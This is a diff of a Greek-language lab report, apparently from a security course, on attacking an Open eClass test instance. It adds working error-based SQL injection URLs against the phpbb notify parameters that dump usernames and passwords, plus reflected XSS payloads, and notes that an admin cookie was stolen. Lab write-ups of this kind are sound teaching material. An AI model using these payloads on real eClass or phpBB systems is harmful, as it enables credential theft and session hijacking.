@@ -216,6 +216,7 @@
        ##### ___Τα δεδομένα εμφανίζονται στη θέση εμφάνισης του κωδικού του μαθήματος (πχ ΤΜΑ100)___
 	 
 	 
+	 
 
   - __XPATH Injections / Duplicate Error Injection__
        
@@ -225,17 +226,58 @@
        
        Εντοπίστηκαν τέτοιου είδους injections σε δύο σημεία.
        
+       - Στη σελίδα ___phpbb/index.php___ (_δούλεψε στον target μας_) \
+       	 στα καμπανάκια γίνεται update το state στη βάση. Έτσι μέσω των μεταβλητων __forumnotify__ και __forumcatnotify__, \
+	 μπορούμε να πάρουμε χρήσιμη πληροφορία μέσω πολλαπλών εμφολευμένων __SELECT__, όπου και επιστρέφει το πιο printable \
+	 αποτέλεσμα ή μέσω συναρτήσεων όπως οι __updatexml()__ και __extractvalue()__.
+	 
+	 
+	 > http://hackerz.csec.chatzi.org/modules/phpbb/index.php?forumcatnotify=' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT group_concat(username,0x3a,password) FROM eclass.user LIMIT 0,1) ) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or ' &cat_id=2
+	 
+	 > http://hackerz.csec.chatzi.org/modules/phpbb/index.php?forumcatnotify=' or extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM eclass.user limit 0,1))) or' &cat_id=2
+	 
+	 > http://hackerz.csec.chatzi.org/modules/phpbb/index.php?forumcatnotify=' or updatexml(0,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM eclass.user limit 0,1)),0) or '&cat_id=2
+
+           
        - Στη σελίδα ___viewforum.php___ (_δούλεψε στον target μας_) \
        	 στα καμπανάκια γίνεται update το state στη βάση. Έτσι μέσω της μεταβλητής __topicnotify__, μπορούμε να πάρουμε \
 	 χρήσιμη πληροφορία μέσω πολλαπλών εμφολευμένων SELECT, όπου και επιστρέφει το πιο printable αποτέλεσμα ή μέσω \
-	 συναρτήσεων όπως οι __updatexml()__ και __extractvalue()__.\
+	 συναρτήσεων όπως οι __updatexml()__ και __extractvalue()__.
 	 
-	 > http://192.168.1.12/modules/phpbb/viewforum.php?forum=1&topicnotify=' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT group_concat(username,0x3a,password) FROM eclass.user LIMIT 0,1) ) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or ' &topic_id=1
 	 
-	 > http://192.168.1.12/modules/phpbb/viewforum.php?forum=1&topicnotify=' or extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM eclass.user limit 0,1))) or' &topic_id=1
+	 > http://hackerz.csec.chatzi.org/modules/phpbb/viewforum.php?forum=1&topicnotify=' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT group_concat(username,0x3a,password) FROM eclass.user LIMIT 0,1) ) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or ' &topic_id=1
 	 
-	 > http://192.168.1.12/modules/phpbb/viewforum.php?forum=1&topicnotify=' or updatexml(0,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM eclass.user limit 0,1)),0) or '&topic_id=1
+	 > http://hackerz.csec.chatzi.org/modules/phpbb/viewforum.php?forum=1&topicnotify=' or extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM eclass.user limit 0,1))) or' &topic_id=1
+	 
+	 > http://hackerz.csec.chatzi.org/modules/phpbb/viewforum.php?forum=1&topicnotify=' or updatexml(0,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM eclass.user limit 0,1)),0) or '&topic_id=1
 
+       
+       
+	 
+	 
+  - __XSS__
+       
+       Με αυτό το είδος της επίθεσης καταφέραμε να πάρουμε το cookie του drunkadmin, όπως αναφέρθηκε στο ___Defacement Section___. \
+       Ουσιαστικά σε κάθε σελίδα __.php__ που τυπώνει κάτι ή/και έχει μέσα κάποια φόρμα με \_GET ή \_POST method, μπορέι να \
+       γίνει XSS attack. Επιπλέον, σε κάθε σελίδα που μπορούμε σύμφωνα με τα προηγούμενο attack να προκαλέσουμε κάποιο SQL error, \
+       τότε μπορούμε να κάνουμε κάποιο __XSS attack__ κάνοντάς το να τυπωθεί μέσα στο SQL error.
+       
+       Όπως περιγράφηκε ___Defacement Section___, αν βάλουμε στην κατάληξη του URL: \
+       -> http://.../file.php/">
+       Τότε "σπάμε" τη μορφοποίηση του αρχείου και ενσωματώνουμε ακριβώς δίπλα στα \_GET ή \_POST methods το δικό μας script \
+       το οποίο και μπορεί να μας δώσει χρήσιμη πληροφορία υπό προϋποθέσεις και συνήθως σε συνδυασμό με κάποιο __CSRF__ attack \
+       μπορούμε να πάρουμε πολλές πληροφορίες, από cookies, μέχρι κωδικούς βάσης και usernames. 
+       _(Περιγράφηκαν και στο ___Defacement Section___ αναλυτικά)_
+       
+       Τα πιο σημαντικά από αυτά, εντοπίστηκαν στις σελίδες: \
+       1. ___agenda.php___
+       > http://hackerz.csec.chatzi.org/modules/agenda/myagenda.php?month=6&year=2020<script>alert('You have been H4cked')</script>
+       
+       2. ___eclass_conf.php___
+       > http://hackerz.csec.chatzi.org/modules/admin/eclassconf.php/"><script>alert('You have been H4cked')</script>
+       
+       3. ___
+       
        
        
 ---
